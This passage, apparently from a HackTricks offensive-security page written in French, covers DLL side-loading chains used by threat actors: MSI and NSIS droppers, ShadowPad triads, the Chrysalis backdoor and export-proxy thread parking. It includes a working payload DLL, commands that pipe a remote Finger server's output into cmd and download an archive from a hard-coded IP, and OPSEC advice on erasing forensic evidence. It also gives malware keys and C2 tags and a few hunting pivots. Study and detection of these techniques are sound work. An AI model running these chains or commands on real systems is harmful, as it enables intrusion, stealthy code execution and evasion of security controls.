4. Enchaînez des techniques standard de contournement UAC pour passer de l'intégrité moyenne aux privilèges SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Les threat actors associent fréquemment des droppers basés sur MSI avec du DLL side-loading pour exécuter des payloads sous un processus de confiance, signé.

Vue d'ensemble de la chaîne
- L'utilisateur télécharge le MSI. Une CustomAction s'exécute silencieusement pendant l'installation GUI (par exemple, LaunchApplication ou une action VBScript), en reconstruisant l'étape suivante à partir de ressources embarquées.
- Le dropper écrit un EXE légitime et signé ainsi qu'une DLL malveillante dans le même répertoire (exemple de paire : wsc_proxy.exe signé par Avast + wsc.dll contrôlée par l'attaquant).
- Lorsque l'EXE signé est lancé, l'ordre de recherche des DLL de Windows charge d'abord wsc.dll depuis le répertoire de travail, exécutant le code de l'attaquant sous un parent signé (ATT&CK T1574.001).

Analyse du MSI (quoi examiner)
- Table CustomAction :
- Recherchez les entrées qui exécutent des exécutables ou du VBScript. Exemple de pattern suspect : LaunchApplication exécutant un fichier embarqué en arrière-plan.
- Dans Orca (Microsoft Orca.exe), inspectez les tables CustomAction, InstallExecuteSequence et Binary.
- Payloads embarqués/découpés dans le CAB du MSI :
- Extraction administrative : msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou utilisez lessmsi : lessmsi x package.msi C:\out
- Recherchez plusieurs petits fragments concaténés et déchiffrés par une CustomAction VBScript. Flux courant :
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Déposez ces deux fichiers dans le même dossier :
- wsc_proxy.exe : hôte signé légitime (Avast). Le processus tente de charger wsc.dll par nom depuis son répertoire.
- wsc.dll : DLL de l'attaquant. Si aucune exportation spécifique n'est requise, DllMain peut suffire ; sinon, construisez une DLL proxy et transférez les exportations requises vers la bibliothèque authentique tout en exécutant le payload dans DllMain.
- Construisez un payload DLL minimal :
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Pour les exigences d'export, utilisez un proxying framework (par exemple DLLirant/Spartacus) pour générer une forwarding DLL qui exécute aussi votre payload.

- Cette technique repose sur la résolution du nom de la DLL par le host binary. Si le host utilise des chemins absolus ou des safe loading flags (par exemple, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), le hijack peut échouer.
- KnownDLLs, SxS, et les forwarded exports peuvent influencer la priorité et doivent être pris en compte lors du choix du host binary et de l'ensemble d'exports.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point a décrit comment Ink Dragon déploie ShadowPad en utilisant un **three-file triad** pour se fondre dans des logiciels légitimes tout en gardant le core payload chiffré sur disque :

1. **Signed host EXE** – des vendors comme AMD, Realtek, ou NVIDIA sont abusés (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Les attackers renomment l'exécutable pour qu'il ressemble à un Windows binary (par exemple `conhost.exe`), mais la signature Authenticode reste valide.
2. **Malicious loader DLL** – déposée à côté de l'EXE avec un nom attendu (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL est généralement un MFC binary obfusqué avec le framework ScatterBrain ; son seul rôle est de localiser le blob chiffré, le déchiffrer et mapper ShadowPad de manière reflective.
3. **Encrypted payload blob** – souvent stocké sous forme de `<name>.tmp` dans le même répertoire. Après le memory-mapping du payload déchiffré, le loader supprime le fichier TMP pour détruire les preuves forensic.

Notes de tradecraft :

* Renommer le EXE signé (tout en conservant l'`OriginalFileName` d'origine dans l'en-tête PE) lui permet de se faire passer pour un Windows binary tout en conservant la signature du vendor ; reproduisez donc l'habitude d'Ink Dragon de déposer des binaries ressemblant à `conhost.exe` mais qui sont en réalité des utilitaires AMD/NVIDIA.
* Comme l'exécutable reste trusted, la plupart des contrôles d'allowlisting n'ont besoin que de votre malicious DLL placée à côté. Concentrez-vous sur la personnalisation de la loader DLL ; le parent signé peut généralement s'exécuter sans modification.
* Le decryptor de ShadowPad attend que le blob TMP soit à côté du loader et writable afin de pouvoir vider le fichier après le mapping. Laissez le répertoire writable jusqu'au chargement du payload ; une fois en mémoire, le fichier TMP peut être supprimé en toute sécurité pour l'OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Les opérateurs associent le DLL sideloading à LOLBAS afin que le seul artefact custom sur disque soit la malicious DLL placée à côté du trusted EXE :

- **Remote command loader (Finger):** Hidden PowerShell lance `cmd.exe /c`, récupère des commandes depuis un Finger server, puis les redirige vers `cmd` :

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` récupère du texte TCP/79 ; `| cmd` exécute la réponse du serveur, permettant aux opérateurs de faire tourner le second stage côté serveur.

- **Built-in download/extract:** Téléchargez une archive avec une extension bénigne, décompressez-la, et placez la cible du sideload ainsi que la DLL dans un dossier aléatoire `%LocalAppData%` :

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` masque la progression et suit les redirections ; `tar -xf` utilise le tar intégré de Windows.

- **WMI/CIM launch:** Démarrez l'EXE via WMI afin que la télémétrie affiche un processus créé par CIM tout en chargeant la DLL colocated :

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Fonctionne avec des binaries qui préfèrent les DLL locales (par exemple, `intelbq.exe`, `nearby_share.exe`) ; le payload (par exemple, Remcos) s'exécute sous le nom trusted.

- **Hunting:** Déclenchez une alerte sur `forfiles` lorsque `/p`, `/m`, et `/c` apparaissent ensemble ; c'est inhabituel hors scripts d'administration.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Une intrusion récente de Lotus Blossom a abusé d'une trusted update chain pour livrer un dropper empaqueté en NSIS qui a mis en place un DLL sideload ainsi que des payloads entièrement in-memory.

Tradecraft flow
- `update.exe` (NSIS) crée `%AppData%\Bluetooth`, le marque **HIDDEN**, dépose un Bitdefender Submission Wizard renommé `BluetoothService.exe`, un `log.dll` malicious, et un blob chiffré `BluetoothService`, puis lance l'EXE.
- Le host EXE importe `log.dll` et appelle `LogInit`/`LogWrite`. `LogInit` charge le blob via mmap ; `LogWrite` le déchiffre avec un stream custom basé sur LCG (constantes **0x19660D** / **0x3C6EF35F**, matériel de clé dérivé d'un hash précédent), écrase le buffer avec du shellcode en clair, libère les temporaires, puis saute dessus.
- Pour éviter un IAT, le loader résout les APIs en hashant les export names avec **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, puis applique un avalanching de style Murmur (**0x85EBCA6B**) et compare les résultats à des salted target hashes.

Main shellcode (Chrysalis)
- Déchiffre un main module de type PE en répétant add/XOR/sub avec la clé `gQ2JR&9;` sur cinq passes, puis charge dynamiquement `Kernel32.dll` → `GetProcAddress` pour terminer la résolution des imports.
- Reconstruit à l'exécution les chaînes de noms des DLL via des transformations bit-rotate/XOR par caractère, puis charge `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Utilise un second resolver qui parcourt le **PEB → InMemoryOrderModuleList**, analyse chaque export table par blocs de 4 octets avec un mixing de style Murmur, et ne retombe sur `GetProcAddress` que si le hash n'est pas trouvé.

Embedded configuration & C2
- La config se trouve à l'intérieur du fichier `BluetoothService` déposé à **offset 0x30808** (taille **0x980**) et est déchiffrée avec RC4 et la clé `qwhvb^435h&*7`, révélant l'URL C2 et le User-Agent.
- Les beacons construisent un profil host séparé par des points, ajoutent le tag `4Q`, puis chiffrent avec RC4 et la clé `vAuig34%^325hGV` avant `HttpSendRequestA` via HTTPS. Les réponses sont déchiffrées en RC4 et dispatchées par un switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + cases de transfert chunked).
- Le mode d'exécution est contrôlé par les arguments CLI : sans args = install persistence (service/Run key) pointant vers `-i`; `-i` relance lui-même avec `-k`; `-k` saute l'installation et exécute le payload.

Alternate loader observed
- La même intrusion a déposé Tiny C Compiler et exécuté `svchost.exe -nostdlib -run conf.c` depuis `C:\ProgramData\USOShared\`, avec `libtcc.dll` à côté. La source C fournie par l'attaquant contenait du shellcode, l'a compilé et exécuté in-memory sans toucher le disque avec un PE. Reproduisez avec :
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Cette étape de compile-and-run basée sur TCC importait `Wininet.dll` au runtime et récupérait un second-stage shellcode depuis une URL codée en dur, offrant un loader flexible qui se faisait passer pour une exécution de compiler.

## Signed-host sideloading avec export proxying + host thread parking

Certaines chaînes de DLL sideloading ajoutent de la **stability engineering** pour que l’hôte légitime reste vivant assez longtemps pour charger proprement les étapes suivantes au lieu de crasher après le chargement de la DLL malveillante.

Modèle observé
- Déposer un EXE de confiance à côté d’une DLL malveillante en utilisant le nom de dépendance attendu, comme `version.dll`.
- La DLL malveillante **proxy toutes les exports attendues** vers la vraie DLL système (par exemple `%SystemRoot%\\System32\\version.dll`) afin que la résolution des imports fonctionne toujours et que le processus hôte continue de fonctionner.
- Après le chargement, la DLL malveillante **patch le point d’entrée de l’hôte** afin que le thread principal tombe dans une boucle `Sleep` infinie au lieu de se terminer ou d’exécuter des chemins de code qui arrêteraient le processus.
- Un nouveau thread effectue le vrai travail malveillant : déchiffrer le nom ou le chemin de la DLL de next-stage (RC4/XOR sont courants), puis la lancer avec `LoadLibrary`.

Pourquoi c’est important
- Le proxying normal des DLL préserve la compatibilité API, mais ne garantit pas que l’hôte reste vivant assez longtemps pour les étapes suivantes.
- Mettre le thread principal en `Sleep(INFINITE)` est un moyen simple de garder le processus signé résident pendant que le loader effectue le déchiffrement, le staging ou le bootstrap réseau dans un worker thread.
- Ne surveiller qu’un `DllMain` suspect peut manquer ce modèle si le comportement intéressant se produit après que le point d’entrée de l’hôte a été patché et qu’un thread secondaire démarre.

Workflow minimal
1. Copier l’EXE hôte signé et déterminer la DLL qu’il résout depuis le répertoire local.
2. Construire une DLL proxy exportant les mêmes fonctions et les relayant vers la DLL légitime.
3. Dans `DllMain(DLL_PROCESS_ATTACH)`, créer un worker thread.
4. Depuis ce thread, patch le point d’entrée de l’hôte ou la routine de démarrage du thread principal pour qu’elle boucle sur `Sleep`.
5. Déchiffrer le nom/config de la DLL de next-stage et appeler `LoadLibrary` ou faire un manual-map du payload.

Pivots défensifs
- Des processus signés chargeant `version.dll` ou des bibliothèques similaires courantes depuis leur propre répertoire d’application au lieu de `System32`.
- Des patches mémoire au point d’entrée du processus peu après le chargement de l’image, surtout des sauts/appels redirigés vers `Sleep`/`SleepEx`.
- Des threads créés par une DLL proxy qui appellent immédiatement `LoadLibrary` sur une seconde DLL avec un nom déchiffré.
- Des DLL proxy à exports complets placées à côté d’exécutables de l’éditeur dans des répertoires de staging inscriptibles comme `ProgramData`, `%TEMP%`, ou des chemins d’archives décompressées.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
